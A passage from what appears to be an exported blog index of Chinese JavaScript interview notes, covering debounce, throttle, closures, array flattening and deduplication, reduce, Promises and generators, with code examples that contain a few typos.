class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//滚动滚动条，1s之后输出</span></span><br><span class="line"><span class="keyword">var</span> timer = <span class="literal">null</span></span><br><span class="line"><span class="built_in">document</span>.onscroll = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    clearTimeout(timer)</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'防抖'</span>)</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-节流函数的作用是什么？（拳皇）"><a href="#6-节流函数的作用是什么？（拳皇）" class="headerlink" title="6.节流函数的作用是什么？（拳皇）"></a>6.节流函数的作用是什么？（拳皇）</h2><p>当持续触发事件时，保证在一定时间内只调用一次事件处理函数，意思就是说，假设一个用户一直触发这个函数，且每次触发小于既定值，函数节流会每隔这个时间调用一次。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//比如浏览器的滚动条操作，滚动时输出1</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span></span><br><span class="line"><span class="built_in">document</span>.onscroll = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(a++)</span><br><span class="line">&#125;<span class="comment">//这样的结果是控制台一直在输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//节流</span></span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">true</span></span><br><span class="line"><span class="built_in">document</span>.onscroll = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//每隔一秒flag才设为true可以输出，其余时间滚动直接出发return</span></span><br><span class="line">   <span class="keyword">if</span>(flag==<span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    flag = <span class="literal">false</span></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a++)</span><br><span class="line">        flag = <span class="literal">true</span></span><br><span class="line">     &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-什么是闭包，闭包的作用是什么"><a href="#7-什么是闭包，闭包的作用是什么" class="headerlink" title="7.什么是闭包，闭包的作用是什么"></a>7.什么是闭包，闭包的作用是什么</h2><p>闭包是指有权访问另一个函数作用域中的变量的函数 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个闭包</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(a)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> func = foo()</span><br><span class="line">func()<span class="comment">//输出2</span></span><br></pre></td></tr></table></figure><p>闭包的作用：</p><p>（1）访问另一个函数作用域中的变量</p><p>（2）私有化变量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">privateVariable</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value;</span><br><span class="line">    <span class="keyword">this</span>.setValue = <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">        value= value;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">this</span>.getValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> privateVariable();</span><br><span class="line">x.setValue(<span class="string">"abcd"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(x.value); <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(x.getValue ()); <span class="comment">//abcd</span></span><br></pre></td></tr></table></figure><p> （3）模拟块级作用域</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-实现一个flattenDeep函数，把嵌套的数组扁平化"><a href="#8-实现一个flattenDeep函数，把嵌套的数组扁平化" class="headerlink" title="8.实现一个flattenDeep函数，把嵌套的数组扁平化"></a>8.实现一个flattenDeep函数，把嵌套的数组扁平化</h2><blockquote><p><code>flattenDeep([1, [2, [3, [4]], 5]]); //[1, 2, 3, 4, 5]</code></p></blockquote><p>（1）ES6的flat方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flat 方法，用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数组没有影响。</span></span><br><span class="line"><span class="comment">//flat 默认只会 “拉平” 一层，如果想要 “拉平” 多层的嵌套数组，需要给 flat 传递一个整数，表示想要拉平的层数。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattenDeep</span>(<span class="params">arr,deepLength</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.flat(deepLength)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当传递的整数大于数组嵌套的层数时，会将数组拉平为一维数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattenDeep</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.flat(<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）利用reduce和concat</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattenDeep</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.reduce(<span class="function">(<span class="params">acc,val</span>)=&gt;</span><span class="built_in">Array</span>.isArray(val)?acc.concat(flattenDeep(val)):</span><br><span class="line">                     acc.concat(val),[])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）利用栈</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flattenDeep</span>(<span class="params">input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> stack = [...input];</span><br><span class="line">    <span class="keyword">const</span> res = [];</span><br><span class="line">    <span class="keyword">while</span>(stack.length)&#123;</span><br><span class="line">        <span class="comment">//从stack中取值</span></span><br><span class="line">        <span class="keyword">const</span> next = stack.pop()</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(next))&#123;<span class="comment">//如果取出的是数组，继续放到栈里</span></span><br><span class="line">            stack.push(...next);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.push(next)<span class="comment">//如果不是数组了，直接放到结果</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.reverse();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-关于reduce函数"><a href="#9-关于reduce函数" class="headerlink" title="9. 关于reduce函数"></a>9. 关于reduce函数</h2><blockquote><p>reduce() 方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。对空数组是不会执行回调函数的。 </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组求和</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">const</span> sum = arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">prev, current</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> prev+current</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">console</span>.log(sum) <span class="comment">//55</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//合并二维数组</span></span><br><span class="line"><span class="keyword">var</span> twoArr = [[<span class="string">'mu'</span>,<span class="string">'zi'</span>],[<span class="string">'dig'</span>,<span class="string">'big'</span>],[<span class="string">'lucky'</span>,<span class="string">'jiji'</span>]];</span><br><span class="line"><span class="keyword">var</span> oneArr = twoArr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">total,currentValue</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// console.log(total)</span></span><br><span class="line">  <span class="keyword">return</span> total.concat(currentValue);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(oneArr);<span class="comment">//["mu", "zi", "dig", "big", "lucky", "jiji"]</span></span><br></pre></td></tr></table></figure><h2 id="10-数组去重"><a href="#10-数组去重" class="headerlink" title="10. 数组去重"></a>10. 数组去重</h2><p>（1）reduce + includes</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="literal">null</span>, <span class="literal">null</span>].reduce(<span class="function">(<span class="params">prev, current</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> prev.includes(current) ? prev : prev.concat(current);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><p>（2）利用ES6的Set数据结构</p><blockquote><p><code>set</code> 类似于数组，且成员值不重复都是唯一的，<code>set</code>本身是一个构造函数。 </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">[...new <span class="built_in">Set</span>(arr)]  <span class="comment">//[1,2,3]</span></span><br></pre></td></tr></table></figure><p>（3）for循环+splice</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j=i+<span class="number">1</span>;j&lt;arr.length;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]==arr[j])&#123;</span><br><span class="line">            arr.splice(j,<span class="number">1</span>)</span><br><span class="line">            j--</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）利用indexOf</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (array .indexOf(arr[i]) === <span class="number">-1</span>) &#123;</span><br><span class="line">            array .push(arr[i])</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（5）利用sort</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr = arr.sort()</span><br><span class="line"><span class="keyword">var</span> array = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i]!==arr[i<span class="number">-1</span>])&#123;</span><br><span class="line">        array.push(arr[i])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（6）利用includes</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!array.includes(arr[i]))&#123;</span><br><span class="line">        array.push(arr[i])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理-JS异步编程，Promise</title>
      <link href="2020/03/08/%E6%95%B4%E7%90%86-JS%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%EF%BC%8CPromise/"/>
      <url>2020/03/08/%E6%95%B4%E7%90%86-JS%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%EF%BC%8CPromise/</url>
      
        <content type="html"><![CDATA[<ul><li>promise</li><li>Generator</li><li>async和await</li><li>宏任务，微任务，事件循环</li><li>手写promise，promise.all，promise.race</li></ul><a id="more"></a><h2 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h2><p>首先想一下，怎么规定函数的执行顺序，通过回调的方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"I am A"</span>);</span><br><span class="line">    callback();  <span class="comment">//调用该函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">"I am B"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A(B);<span class="comment">//先执行A后执行B，当需要执行ABCDEFG时，就会造成回调地狱</span></span><br></pre></td></tr></table></figure><p>回调地狱“也叫”回调金字塔“，我们平时写代码的时候 js如果异步 回调是不可避免的  例如 ajax不断的进行异步请求数据 回调方法里还要对数据进行处理，继续回调…形成回调地狱  这会使得我们的代码可读性变差，出现问题 不好调试 也会导致性能下降 </p><p><strong>Promise：同步代码解决异步编程</strong></p><ul><li>是一个构造函数，用来传递异步操作消息，链式调用，避免层层嵌套的回调函数。</li><li>promise接收两个函数参数，resolve和reject，分别表示异步操作执行成功后的回调和失败的回调</li><li>promise在声明的时候就已经执行了</li><li>有三种状态：pending进行中、resolve已完成、rejected已失败,</li><li>这些状态只能由pending -&gt; resolved, pending -&gt; rejected,一旦promise实例发生改变，就不能在变了，任何时候都能得到这个结果</li><li>promise对象的then方法会返回一个全新的promise对象</li><li>前面then方法中的回调函数的返回值会作为后面then方法回调的参数</li><li>如果回调中返回的是Promise，那后面的then方法的回调会等待它的结果</li><li>promise.reslove()可以快速创建一个Promise对象</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>) <span class="comment">//立刻执行</span></span><br><span class="line">    resolve()      <span class="comment">//Promise.then是微任务</span></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">4</span>)  <span class="comment">//输出1,2,4,3,5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//resolve可以接收参数</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">    resolve(<span class="string">"2"</span>)</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//现在有work1 ~ work4四个方法,怎么实现顺序执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">work1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"work1"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">res,rej</span>)</span>&#123;</span><br><span class="line">        res()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">work2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"work2"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">res,rej</span>)</span>&#123;</span><br><span class="line">        res()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">work3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"work3"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">res,rej</span>)</span>&#123;</span><br><span class="line">        res()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">work4</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"work4"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">res,rej</span>)</span>&#123;</span><br><span class="line">        res()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">        resolve()</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">()</span>=&gt;</span>work1())    <span class="comment">//.then里面放的是函数，会执行</span></span><br><span class="line">      .then(<span class="function"><span class="params">()</span>=&gt;</span>work2())</span><br><span class="line">      .then(<span class="function"><span class="params">()</span>=&gt;</span>work3())</span><br><span class="line">      .then(<span class="function"><span class="params">()</span>=&gt;</span>work4())</span><br><span class="line">      .finally(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"work done!"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([work1(),work2(),work3()]).then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"work1,work2,work3"</span>)</span><br><span class="line">&#125;)<span class="comment">//所有操作全完成之后的操作</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.race([work1(),work2(),work3()]).then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"有就行"</span>)</span><br><span class="line">&#125;)<span class="comment">//有一个成功就行</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿点外卖为例，点外卖后可能会成功派送也可能会延迟，无论如何都会有个结果</span></span><br><span class="line">funtion dianwaimai()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">reslove,reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> result = cooking()</span><br><span class="line">        <span class="keyword">if</span>(result===<span class="string">"做好了"</span>) reslove(<span class="string">"正在派送"</span>)</span><br><span class="line">        <span class="keyword">else</span> reject(<span class="string">"还没做好"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cooking</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? <span class="string">'菜烧好了'</span> : <span class="string">'菜烧糊了'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行</span></span><br><span class="line">dianwaimai().then(<span class="function"><span class="params">res</span>=&gt;</span><span class="built_in">console</span>.log(res)).catch(<span class="function"><span class="params">res</span>=&gt;</span><span class="built_in">console</span>.log(res))</span><br></pre></td></tr></table></figure><h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><ul><li>Generator 的中文名称是生成器，</li><li>通过<code>function*</code>来定义的函数称之为“生成器函数”（generator function），它的特点是可以中断函数的执行，每次执行<code>yield</code>语句之后，函数即暂停执行，直到调用返回的生成器对象的<code>next()</code>函数它才会继续执行。</li><li>也就是说Generator 函数是一个状态机，封装了多个内部状态。执行 Generator 函数返回一个遍历器对象（一个指向内部状态的指针对象），调用遍历器对象的next方法，使得指针移向下一个状态。 </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = say()<span class="comment">//返回一个遍历器对象</span></span><br><span class="line">obj.next()  <span class="comment">//Object &#123;value: 0, done: false&#125;</span></span><br><span class="line">obj.next()  <span class="comment">//Object &#123;value: 1, done: false&#125;</span></span><br><span class="line">obj.next()  <span class="comment">//Object &#123;value: 2, done: false&#125;</span></span><br><span class="line">...</span><br><span class="line">obj.next()  <span class="comment">//Object &#123;value: 9 done: false&#125;</span></span><br><span class="line">obj.next()  <span class="comment">//Object &#123;value: undefined, done: true&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//计数</span></span><br><span class="line">funtion* count()&#123;</span><br><span class="line">    <span class="keyword">let</span> c=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">yield</span> c++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> countNum = count()</span><br><span class="line">countNum.next()</span><br><span class="line"></span><br><span class="line"><span class="comment">//next方法可以传值</span></span><br><span class="line">funtion* count()&#123;</span><br><span class="line">    <span class="keyword">let</span> c=<span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> status = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">while</span>(!status)&#123;</span><br><span class="line">        status = <span class="keyword">yield</span> c++ <span class="comment">//还可以接收值，先接收值然后就暂停，赋值在后面</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> countNum = count()</span><br><span class="line">countNum.next()</span><br><span class="line">countNum.next()</span><br><span class="line">countNum.next(<span class="literal">true</span>)<span class="comment">//停止</span></span><br></pre></td></tr></table></figure><h2 id="async和await"><a href="#async和await" 